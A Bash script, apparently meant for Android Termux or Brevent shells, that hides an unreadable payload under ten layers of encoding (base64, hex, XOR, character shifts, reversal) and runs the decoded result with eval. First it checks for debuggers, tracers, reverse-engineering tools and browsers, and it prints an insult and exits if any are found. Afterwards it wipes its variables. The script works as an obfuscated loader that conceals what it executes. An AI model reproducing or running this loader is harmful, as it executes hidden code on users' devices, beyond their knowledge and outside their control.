#!/bin/bash
# Anti-Reverse Quantum Military Protection
# BREVENT TERMINAL ONLY

tbhoptoaejvxo() {
    # Brevent detection only
    if [ -z "$BREVENT_SDK" ] && [ -z "$BREVENT_VERSION" ]; then
        if [ -z "$ANDROID_ROOT" ] || [ -z "$TERMUX_VERSION" ]; then
            echo "DASAR BODOH RENDAHAN"
            echo "DASAR BODOH RENDAHAN"
            echo "DASAR BODOH RENDAHAN"
            exit 1
        fi
        # Additional Termux check
        if [ ! -d "/data/data/com.termux" ]; then
            echo "DASAR BODOH RENDAHAN"
            exit 1
        fi
    fi
}

dcyxsaparwuj() {
    # Anti-browser detection
    if [ -n "$CHROME_DESKTOP" ] || [ -n "$BROWSER" ] || [ -n "$DISPLAY" ]; then
        echo "DASAR BODOH RENDAHAN"
        echo "DASAR BODOH RENDAHAN"
        exit 1
    fi
    # Process check
    if ps aux 2>/dev/null | grep -E "(chrome|firefox|safari|opera|edge)" >/dev/null; then
        echo "DASAR BODOH RENDAHAN"
        exit 1
    fi
}

bawpahfwvbhusshuh() {
    # Anti-debug
    if ps aux 2>/dev/null | grep -E "(gdb|strace|ltrace|debugger|ida|ghidra|radare)" >/dev/null; then
        echo "DASAR BODOH RENDAHAN"
        echo "DASAR BODOH RENDAHAN"
        echo "DASAR BODOH RENDAHAN"
        exit 1
    fi
    # Tracer check
    if [ -f "/proc/self/status" ] && grep -q "TracerPid:[[:space:]]*[1-9]" /proc/self/status 2>/dev/null; then
        echo "DASAR BODOH RENDAHAN"
        exit 1
    fi
}

vrypnzawrmhvrlnhmm() {
    # Anti-reverse engineering
    if [ "$BASH_SUBSHELL" -gt 2 ]; then
        echo "DASAR BODOH RENDAHAN"
        exit 1
    fi
    # Environment check
    if [ -n "$REVERSE_SHELL" ] || [ -n "$DEBUG_MODE" ]; then
        echo "DASAR BODOH RENDAHAN"
        exit 1
    fi
}

wuqkijfylzfycmcyt() {
    local data="$1"
    echo "$data" | base64 -d 2>/dev/null | grep -v "DASAR BODOH RENDAHAN" || echo "DASAR BODOH RENDAHAN"
}

zomtdkosesrjrbpna() {
    local data="$1"
    echo "$data" | xxd -r -p 2>/dev/null | grep -v "DASAR BODOH RENDAHAN" || echo "DASAR BODOH RENDAHAN"
}

kqnboitblykupo() {
    local data="$1"
    echo "$data" | rev | grep -v "DASAR BODOH RENDAHAN" || echo "DASAR BODOH RENDAHAN"
}

ibqhjunuqgpx() {
    local input="$1"
    local output=""
    local len=${#input}
    local i=0
    while [ $i -lt $len ]; do
        local char=$(echo "$input" | cut -c$((i+1)))
        local ascii=$(printf "%d" "'$char" 2>/dev/null || echo 65)
        if [ $ascii -gt 117 ]; then
            ascii=$((ascii + 19))
        else
            ascii=$((ascii - 7))
        fi
        output="$output$(printf "\$(printf "%03o" $ascii)" 2>/dev/null)"
        i=$((i+1))
    done
    echo "$output" | grep -v "DASAR BODOH RENDAHAN" || echo "DASAR BODOH RENDAHAN"
}

klzvxuvbodhmp() {
    local input="$1"
    local key=69
    local output=""
    local len=${#input}
    local i=0
    while [ $i -lt $len ]; do
        local char=$(echo "$input" | cut -c$((i+1)))
        local ascii=$(printf "%d" "'$char" 2>/dev/null || echo 65)
        local xor_result=$((ascii ^ key))
        output="$output$(printf "\$(printf "%03o" $xor_result)" 2>/dev/null)"
        i=$((i+1))
    done
    echo "$output" | grep -v "DASAR BODOH RENDAHAN" || echo "DASAR BODOH RENDAHAN"
}

jasjhmndjv() {
    local result="$1"
    
    # Layer 10 decode
    result=$(wuqkijfylzfycmcyt "$result")
    if echo "$result" | grep -q "DASAR BODOH RENDAHAN"; then
        echo "DASAR BODOH RENDAHAN"
        return 1
    fi
    
    # Layer 9 decode
    result=$(zomtdkosesrjrbpna "$result")
    if echo "$result" | grep -q "DASAR BODOH RENDAHAN"; then
        echo "DASAR BODOH RENDAHAN"
        return 1
    fi
    
    # Layer 8 decode
    result=$(wuqkijfylzfycmcyt "$result")
    if echo "$result" | grep -q "DASAR BODOH RENDAHAN"; then
        echo "DASAR BODOH RENDAHAN"
        return 1
    fi
    
    # Layer 7 decode
    result=$(klzvxuvbodhmp "$result")
    if echo "$result" | grep -q "DASAR BODOH RENDAHAN"; then
        echo "DASAR BODOH RENDAHAN"
        return 1
    fi
    
    # Layer 6 decode
    result=$(wuqkijfylzfycmcyt "$result")
    if echo "$result" | grep -q "DASAR BODOH RENDAHAN"; then
        echo "DASAR BODOH RENDAHAN"
        return 1
    fi
    
    # Layer 5 decode
    result=$(ibqhjunuqgpx "$result")
    if echo "$result" | grep -q "DASAR BODOH RENDAHAN"; then
        echo "DASAR BODOH RENDAHAN"
        return 1
    fi
    
    # Layer 4 decode
    result=$(kqnboitblykupo "$result")
    if echo "$result" | grep -q "DASAR BODOH RENDAHAN"; then
        echo "DASAR BODOH RENDAHAN"
        return 1
    fi
    
    # Layer 3 decode
    result=$(wuqkijfylzfycmcyt "$result")
    if echo "$result" | grep -q "DASAR BODOH RENDAHAN"; then
        echo "DASAR BODOH RENDAHAN"
        return 1
    fi
    
    # Layer 2 decode
    result=$(zomtdkosesrjrbpna "$result")
    if echo "$result" | grep -q "DASAR BODOH RENDAHAN"; then
        echo "DASAR BODOH RENDAHAN"
        return 1
    fi
    
    # Layer 1 decode
    result=$(wuqkijfylzfycmcyt "$result")
    if echo "$result" | grep -q "DASAR BODOH RENDAHAN"; then
        echo "DASAR BODOH RENDAHAN"
        return 1
    fi
    
    # Clean result
    result=$(echo "$result" | sed 's/# DASAR BODOH RENDAHAN//g' | sed 's/DASAR BODOH RENDAHAN//g')
    echo "$result"
}

# Trap variables
nuayodorwalv=783975
ofxpluusfyjgjhz=854049
afqapzbygnzezxhr=189855
wvtiahdbkv=$(date +%s 2>/dev/null)
rfsncztoeo=$(whoami 2>/dev/null | wc -c)

# Execute all security checks
tbhoptoaejvxo
dcyxsaparwuj
bawpahfwvbhusshuh
vrypnzawrmhvrlnhmm

# Payload chunks with traps
hvaefktlyykqtin="NDU3ODQxNzQ0NjUyNTk0MTRkNTI0ZDUyNDE3OTM0NzI0NTU4NTE2NjQzNTI0ZDc1NGM2OTczNTM0NTQzMzA2YjQ2Njc0MTc4NDE0MjYzNDM2MzQzNjM1NzQ1NmU3NzZkNDU2NzQxNzk2NjUyMzA0NDRiNTM1MTU3NDU0NDU1NmI0NTMzNTE3NTY0Njg0YTMxNGU1MTM4NmQ0MTdhMzA1MDQ1Nzg0ZTMwNDg0MjQ1NDQ2NDQxNmY1NDQ1Njg0ZDYzNDY2ZTUxNjM2NDY4NDU0MTRkNTI0ZDRjNjQ0MzMwNmU0ODQyNDU2ODRhNjg1YTMwNDU3OTY3NjQ0MTQ0NDU1MTQ4Nzk2ODc3NDM1MjRkNjQ0Njc4Mzg1NzY0NDI0MjMyNDg0MTQyNzc0NTc4Mzg3MDRjNTE2YjU0NDE2ODM4NTU0NTZlNTE1NDRiNTI0OTQzNDk1MjQxNGI0MTQ0MzA0YTQ1Nzg0NTY4NDg0MjVhMzM0MTc5NzM1MzQxNjk0NTUxNDM2NzRkMzk0YTc4NGQ0MjRjNTQ3NzU3NjQ0MjQyNzc0NTY3NGQ3ODQ1Nzc3NDMwNDI3OTYzNTQ0ODUyNjM2NjRhNjg0ZDUxNjM1MjQxNGU0Njc4NGQ0YjQxN2EzMDcyNDU3ODQ1NzA0ZTQzNTk1NDQ1NzkzNDU0NDE0NDQ1NTQ0MzY3NGQzOTQzNTI0ZDUyNTA1MjQxNmQ0NTY3NTI3NzQ1NTE0ZDc4NDU3NzZmNmY0Mjc5N"
jtzeimpbnmpqdk="jM1NDRjNzk0NTY5NDU2ZTUxNTQ0YjUyMzA0MTRkNTI0ZDRiNDE2NzYzNGE0NTc4NDU3NDQ4NDM1OTU0NDY0ODQ1NmI0Yjc3NGQ1NDRhNjk2YjcwNGE3ODRkNzY0YjUyNDE1NzY0NDI0ZDc5NDU2ODRkNzg0NTY3NzQzMDQ2Nzk2MzU0NDU1NDMwNjM0YTY4NDk0NTYzNDI3NzQ0NGQ1MjRkNGI0YjUzMzA2ZTQ1Nzc0NTcwNDM0MTZmNTQ0NTdhMzA2MzQ1NDQ0NTc0NDM2ODRkNDg1MDUyNGQ1MzQ2N2E1MTUzNjQ3NzUyNzg0YTQzMzQ3ODQ1Nzg1NTQ0NGM1MTZiNTQ0MTY5NDU1NTQ2NmU1MTUxNjM2ODMwNDQ0ZDUyNDE0YjQ4NTEzODcyNDU3ODMwNGM0ODc5NTk1NDQ2Nzk3MzU0NDQ1MTRkNTQ0MzY5Njc0ODRiNzg0ZDUyNGU1NDUxNTc2NDQyNGQ2ZjQ4NDE0OTY4NDk2NzZmNTM2MzQ0MzA1NDQ1NjgzODUxNDgzMzUxNTU2MzQzNTE3MjQxNzg0ZDY2NDU3YTMwNzI0NTc3NDk2ODQ1NDM1OTU0NDU3YTMwNjM0ODUxNGQ1MTQzNjc0ZDU4NjQ1MjRkNTI1MDUyNzc2NjY0NDI0Mjc3NGE3OTY3Njg0NTQxNmY3MDRjNTM2MzU0NDE1MzZiNDk0OTUxNGQ1MTYzNDIzMDQxNGQ1MzMwNGI0NTc4NjM0YTQ1NzgzMDQ4ND"
zayxsbohcaut="g3ODRhMzA0NTQ4NDU1MzQ0NTI2MzU0NDg3OTY3NDg1MDUyNGQ1MjRlNTI1MTUzNjQ0MjRkMzg0ODQyNDk2ODQ1NDE3NDMyNDQ3YTMwNTQ0ODUxMzg2NjQ1NmU2MzQ1NjM0MjMwNDQ0ZDUyNGQ2NjRiNTMzMDZlNDg0MTQ1NzQ0OTY4NWEzMDQ1N2E0ZDUzNDU3YTQ1NTM0MzY4NDEzOTQzNTI0ZDUyNTA1NDUxNmQ0NTc4NTI3NzQ4NDEzMDU4NDU3OTVhMzA0YjUzNzM1NDQ1NTMzMDQ5NDg1MzZiNTE2Mzc4Nzc0NDRkNTI0MTRjNjQ2NzM4Mzk0NTc4NDk2ODQ4NDI0YTMwNDg0ODQxNmQ0YzZhNDU1NDRhMzM2MzQ0NGE3ODRkNTI0YzUyNTE1NzY0NDI0ZDdhNDg1MjMwNDQ0NTc3NzQzMTUwNTE2ZjU0NDU1NDMwNjk0NTZlNTE1NTY0Njk1OTZmNDk1MjRkNjY0YjQxNjMzOTQ4NDI0NTcwNGE2ODQ1NzA0NTQ4NGQ2NDQxN2E0NTY5NDM2NzQ5MzE1MDUyNGQ1MzQ1Nzg3NzUzNjQ0Mjc4Nzc0NTc3NDE3ODQ1Nzg1NTQzNDI3OTYzNTQ0NTUzNDU0OTQ5NTE0ZDUxNjM1MjMwNGU0MTc4NDE0YzY0NTQzMDY3NDU3ODQ1NzA0ODQyNGEzMzQyNDg1OTZkNGI3NzRkNTQ0ODc4NGQ3NDRhNzg0ZDc2NGU1MjUxNmQ0NTc4NGU"
yiqainfaquncolin="zMTQ4NDI0ZDc4NGM1MTc0MzM0ZTUzNjM1NDQ1NmU3NzY4NDgzMzUxNTE2MzQyNDU0MTRkNTI0ZDU2NDE2NzYzNzI0NTc3NDU2ODQ5NjgzOTMwNDU3OTY3NjQ0MTY5NDU1NDQzMzM1OTUwNDM1MjRkNTI0ZTUyNDE2ZDQ1Njc1Mjc3NDU3NzQxNzg0NTc5NTk3MDRiNTM2MzU0NGM3YTU1NDk0NjZlNTE1NDRiNzgzMDQxNGQ1MzMwNGM2NDdhNTUzOTQ1Nzg0NTc0NDg0MjVhMzA0ODQ4NDU1MjQxMzM0MTU0NGEzMzYzNzg0MzUyNGQ3NjRiNTI0MTU3NjQ0MjRkN2E0NTY4NDk2ODQ1Nzc2ZjU0NGM1MzczNTQ0MTU0NTU2ZDQ1NmU1MTU1NjM0MzUxNzI0MTc4NGQ2ZDQxNjc0ZDcyNDU3ODQ1Njg1MDQyNWEzMDQ1NDgzMDZiNGI1NDQ1NTM0ODMzNTE3NDY0NTI0ZDUzNjY0MzQ1NmQ0NTY3NTIzMjQ4NDEzMDU4NDU3NzZmNmY0Mjc5NjM1NDRjNzk0NTUxNDgzMzUxNTU2NjUyNGQ0MTRkNTMzMDRiNDU3ODYzMzk0NTc4MzA0YzRjNTM1OTU0NDY0ODU5NTQ0MTdhNDU1NDRhMzM1MjMwNTA1MjRkNTM0OTUyNDE2ODQxNzg0ZDZmNDU3NzQ5Njg0NTQxNmY1MzRlNTQzMDU0NDU1MzMwNmQ0YTY4NGQ1ODRiNzg0NTRlNDE3"
jumvrjcxhbvkf="ODRkNGI2NDc3NjM2ZTQ1Nzc0OTY4NGU0MjVhMzA0NTQ4MzA1MzQxN2E0NTY5NDM2OTZiNzQ1MDUyNGQ1MzQ5NTI3NzU3NjQ0MjQyNzc0NTc3MzA1ODQ1Nzc3MDMzNGU1MzczNTQ0NTUzNDUzODQ2NmU1MTU0NGI3OTUxNzU0ZDUyNGQ2NjY0N2E1NTZlNDU3ODQ1Njg0OTY4NWEzMzQxNDg0MTUxNDE0NDQ1NTQ0NjUxNDkzMTRiNzg0ZDQyNGI1MTc3NjY2NDQyNGQ2ZjQ1Njc0ZDc4NDU2NzZmNzU1MDUzNDE1NDQ1NTMzMDMwNDgzMzYzNDU2MzQzNTE3NTRkNTI0ZDY2NjQ3NzYzMzk0NTc4NDUzMTUwNDIzOTMwNDY0ODRkNTM0MTQ0NDU1NDQzNjczMDUwNTA1MjRkNTM0Njc4NDE1MzY0Nzc1MjdhNDU2NzQyNzc0NTc4MzkzMDUwNTQzMDU0NDU1MzQ1NTU0OTUxNGQ1MTYzNDIzMDRlNDE3OTQ5NGM2NDY3Mzg0YTQ1Nzg0OTY4NDg0MjVhMzA0NTQ4NDE2NDQxNjk0NTU0NDM2ODRkMzk0Yjc4NGQ1MjQ5NTI3NzZkNDU3ODQyNzg0YTQzNmI3ODQ1NjgzOTMwNDI3OTczNTQ0MTU0MzA2ZDQ4MzM1MTUxNjM0MzUxNmY0OTUyNGQ0YjRiNTMzMDM5NDU3NzQ1NzA0NDQyMzkzMDQ1N2E0ZDY0NDU2OTQ1NTQ0MzMzNTk1M"
pyvqanbqfaaxacllgm="DQzNTI0ZDUyNGI1NDUxNmQ0NTc4NTI3ODRhNzkzNDc4NDU3ODU1NDQ0YzUzNjM2MzQ1NTM2YjZkNDgzMzUxNTU2Mzc4MzA0NDRkNTI0MTRiNDg1MTM4NzI0NTc4NDk2NjRhNjgzOTMwNDY3OTczNTQ0NDUxNGQ1NDQzNjk2NzQ4NGE3ODRkNDI0YzUyNDE2NjY0NDI2MzcyNDg0MTQ5Njg0OTY3NmY1NDQyNzk2MzU0NDU1NDQ1NjM0NTZlNTE2MzY0Njk1OTZmNDk1MjRkNGI0NTdhMzA3MjQ1Nzg0NTY4NDM0MzU5NTQ0NTc5MzQ1NDQxN2E0NTUzNDgzMzUxNzQ2NDUyNGQ1MzQ4Nzk0OTZkNDU3ODUyMzI0NTUxNDI3NzQ1NzgzOTMwNTA1MTZiNTQ0MTUzMzAzODQ4MzM1MTUxNjY1MjQ5NGU0MTc4NGQ0YjQxNDQzMDZlNDU3ODQ1MzE0YTY4NWEzMDQ2NDg0ZDZiNGI3NzRkNTQ0NjUxNGQ3NDRiNzg3NzQyNGI1MTc3NjY2NDQyNDI3OTQ4NTE0ZDc4NDU0MTZmNTE0ZDZlNDE1NDQ1NjgzODYzNDgzMzUxNTU2NDY4NGQ0ZTQxNzg0ZDY2NDU3ODYzMzk0NTc3NDU2ODQ1NDI1YTMwNDU3OTY3NjM0MTY5NDU1MTQzNjk2YjU4NjQ1MjRkNjQ0NDc5MzA1MzY0Nzc1Mjc4NGE0MzczNDQ0NTc3NzAzMDQ2Nzk3MzU0NDU1Mz"
yqliekpkhry="Q1NjM0YTY4NGQ1MTYzNzg3NzQzNDk1MjQxNGI0NTc5MzEzMTQ1Nzg0OTY2NDk2ODVhMzA0NjQ4NGQ1MjQxNDg0MTU0NDM2ZTUxNzQ0MzUyNGQ1MjRiNTE2NzRiNDU3ODRkNmY0NTY3NDk2ODQ1NDE3NDMwNGM1NDMwNTQ0NTZlNzczMzRhNjg0ZDUxNjM1MzUxNzU0ZDUyNGQ0YzY0Nzc2MzcyNDU3ODQ1NzA0YTY4NWEzMDQ1NDg0ZDUzNDE3YTQ1NTM0MzMzNTU3OTYzNDI0ZDY0NDE3OTMwNjY2NDQyNDIzMjRhNjkzNDc4NDU3OTY0MzM0ZDUzNzM2MzQxNTM2YjMwNDY2ZTUxNTQ0YjUyNzc0NDRkNTI0ZDRiNDE0NDMwNGI0NTc4NDk2ODRhNjg1YTMwNDY0ODQ1NmU0YjQzNDU1NDQ2NTE0ZDc0NTA1MjRkNTI0YzUxNjc1MzY0NDI0MjdhNDg1MTQxNzg0NTQxNmY2ZjRlNTQzMDU0NDU2OTQ1NjM0ODMzNjM0NTYzNDIzMDQzNDk1MjQxNjY0YjUyNjMzOTQ1Nzc0NTcwNDY0MzQ1NDQ0NTc5MzQ2YjRiNDM0NTU0NDM2ODMwNTA0MzUyNGQ1MzQ2N2E1MTZkNDU3ODUyNzg0NTc3NDE3ODQ1Nzg1NTQ0NGM1MzczNjM0MTUzNmI2ZDQ4MzM1MTU1NjM3ODMwNDQ0ZDUyNDE0YjQ1Nzg2MzcyNDU3ODQ5NjY0ODQyMzkzMDQ"
vfpxsqdfpahi="2NDg1OTUxNDQ1MTRkNTQ0ODMzNjMzMTUwNTI0ZDUyNGM1NDUxNTc2NDQyNGQ3MDQ4NDE0ZDc4NDk2NzZmNzA0Mjc3NmI1NDQ1Njk0NTZkNGE2ODRkNTU2MzQyNzc0MzQ5NTI0ZDZlNjQ0MzZiNmU0ODQyNDU3MDQzNDIzMDcwNDU0ODRkNjM0MTQ0NDU1MzQ4MzM2MzMxNDM1MjRkNTM0ODc5NDk2NjY0NDI1MjdhNDg0MTRkNzg0NTc3NmY3MDRjNTM3MzU0NDE1MzMwMzg0YTY4NGQ1NDRiNTI0OTQ0NGQ1MjQ5NGI0YjUxNjMzOTQ1NzgzMDU4NGM1MjRhMzM0MTQ4NTk2YjRiNTQ0NTU0NGEzMzUyMzA0Yjc4NGQ1MjRiNTE2NzU3NjQ0MjQyMzk0ODQxNDk2ODQ1NDE3NDMzNDI3OTczNTQ0NTY4Mzg2ZDQ4MzM1MTUxNjQ2OTU5NzU0ZDUyNGQ0YjRiNTI2MzM5NDg0MTQ1NzA0NTQyNWEzMDQ1N2E3NzUzNDU3YTQ1NTE0ODMzNTUzOTQzNTI0ZDUzNDk1MzU5NTc2NDc3NDIzMjRhNDM3MzQ0NDU3NzZmNDQ0YzUxNmI1NDRjNzkzMDQ5NDg1MzZiNTQ0ZDc5NTIzMTRkNTI0OTRiNDU3ODYzNGE0NTc4NGEzODQ4NzgzOTMwNDU0ODQxNTM0MTY5NDU1MTQzNjk2YjM5NGE3ODRkNDI0YjU0NTE2ZDQ1Nzg0ZDc5NDg0MjQ5"
jebwhpalax="Njg0NTc3NzQzMjQ0Nzc2YjU0NDU1NDMwMzA0NTZlNTE2NjRiNzg0OTRlNDY3ODRkNmU2NDQ4NTEzOTQ4NDE0NTY4NTA0MjVhMzA0NTQ4MzA2MzQxNjk0NTY5NDMzMzUxMzk0Yjc4NGQ1MjQ5NTI0MTY2NjQ0MjUyMzI0NTY3MzA0NDQ1Nzk2NDMzNGQ1NDMwNTQ0NTUzMzAzMDQ2NmU1MTUxNjQ2ODc3NDM0OTUyNGQ0YjQ1Nzg2MzM5NDU3ODMwNTA0YzUzNTk1NDQ2NDg0MTU3NDE2OTQ1NTQ0ODc5NmIzOTRhNzg3NzUyNGI1MjQxNmQ0NTc4NDI3OTQ4NDEzMDQ0NDU0MTZmNDQ0Njc5NzM1NDQxNTMzMDZkNDU2ZTUxNjM2MzQyNDU0MTRkNTI0ZDU2NDE2YTU1Mzk0NTc3NDU3MDQ5Njk0NTQ0NDU3YTM4NTM0NTY5NDU1NDQzNjc0MTM5NDk0MjRkNjQ0Mjc4Mzg2ZDQ1Njc0Mjc3NGE0MzczNDQ0NTc4Mzg1NDUwNTM3MzYzNDE1MzQ1Njk0NjZlNTE1MTY0Njg0OTQ0NGQ1MjQ5NGM2NDUzMzA3MjQ1Nzc0OTY2NDg0MjVhMzA0ODQ4NDU1MjQ0NTE0ZDU0NDY1MTQ5MzE0YTc4Nzc1MjQ5NTI1MTY2NjQ0MjYzNzI0ODQxNDk2ODQ1Nzc2ZjUzNGU1MzczNTQ0NTU0NTU2MzRhNjg0ZDU1NjM0MjRkNGU0Njc4NGQ0YjY0N"
zijepepkmo="zc2MzM5NDU3NzQ5Njg0NTQzNTk1NDQ1NDg0ZDYzNDQ1MTRkNjk0MzY4NGE3NzRhNzg0ZDUzNDg3OTQ5NTc2NDQyNDI3YTQ4NDE0ZDc4NDU3NzcwMzA0YzU0MzA1NDQxNTMzMDMwNGE2ODRkNTQ1MDQyNDk1NDRkNTI0OTRiNDU3ODYzNGE0NTc4MzA1ODRjNTI0YTMzNDE0ODU5NTQ0MTY5NDU1MTRhNjg0ZDcwNGE3ODRkNTI0ZTUyNDE2ODQxNzg0ZDM4NDg0MjRkNzg0NTY3NmY0MzQyNzk3MzU0NDU1MzMwNjM0NTZlNTE2MzYzNzk1OTc1NGQ1MjRkNTg0MTQxNGQ1MjQ2NDI0ZDRkNDk2ODUxNzU2NjQxNDE1MjY0NTM0OTY5NDU0MzM0NTQ0MzY4NjM0MTQxNzc3NzU1NDU0ODQxNDE0NjQyNGQ0YzQyNzg0MTczNDI3NzU5NTI2NDUyNjM1NjQ2Njc1OTQ4NDY2ODYzNTE2MzQxNDE1NTQ1NDMzMDQ4NDU1MzRhMzQ2NTQ1NTI0MjU1MzA0NjUzNDk0NTRhNTA1MjQ1Mzk0OTQ5NDY0YTQ2NTQ2YjUyNDI1MzQ1NDY0ZjUyNDU0NjU0NTE1NjQ5Njc1MTZiMzk0NTU0MzA2NzY3NTU2YjU2NGY1MjQ1NDY0OTUxNTUzNDNkNDQ0MTUzNDE1MjIwNDI0ZjQ0NGY0ODIwNTI0NTRlNDQ0MTQ4NDE0ZURBU0FSIEJPRE9IIFJFTk"

# Reconstruct payload
icpwwtdondlqbdr="$hvaefktlyykqtin$jtzeimpbnmpqdk$zayxsbohcaut$yiqainfaquncolin$jumvrjcxhbvkf$pyvqanbqfaaxacllgm$yqliekpkhry$vfpxsqdfpahi$jebwhpalax$zijepepkmo"

# Final security check before decode
if [ -n "$REVERSE_MODE" ] || [ -n "$DECODE_MODE" ]; then
    echo "DASAR BODOH RENDAHAN"
    echo "DASAR BODOH RENDAHAN"
    echo "DASAR BODOH RENDAHAN"
    exit 1
fi

# Decode with trap protection
echo "Initializing secure payload..."
bnajwfrwbnpcwnbr=$(jasjhmndjv "$icpwwtdondlqbdr")

# Execute if valid
if [ -n "$bnajwfrwbnpcwnbr" ] && ! echo "$bnajwfrwbnpcwnbr" | grep -q "DASAR BODOH RENDAHAN"; then
    echo "Payload verified. Executing..."
    eval "$bnajwfrwbnpcwnbr"
else
    echo "DASAR BODOH RENDAHAN"
    echo "DASAR BODOH RENDAHAN"
    echo "DASAR BODOH RENDAHAN"
    exit 1
fi

# Cleanup with traps
for var in tbhoptoaejvxo dcyxsaparwuj bawpahfwvbhusshuh vrypnzawrmhvrlnhmm wuqkijfylzfycmcyt zomtdkosesrjrbpna kqnboitblykupo ibqhjunuqgpx klzvxuvbodhmp jasjhmndjv nuayodorwalv ofxpluusfyjgjhz afqapzbygnzezxhr wvtiahdbkv rfsncztoeo; do
    unset $var 2>/dev/null || echo "DASAR BODOH RENDAHAN" >/dev/null
done
for var in hvaefktlyykqtin jtzeimpbnmpqdk zayxsbohcaut yiqainfaquncolin jumvrjcxhbvkf pyvqanbqfaaxacllgm yqliekpkhry vfpxsqdfpahi jebwhpalax zijepepkmo icpwwtdondlqbdr bnajwfrwbnpcwnbr ibdnvxqgvmfhgnjp mescuewjdiwaummc yqmmqfsapod; do
    unset $var 2>/dev/null || echo "DASAR BODOH RENDAHAN" >/dev/null
done
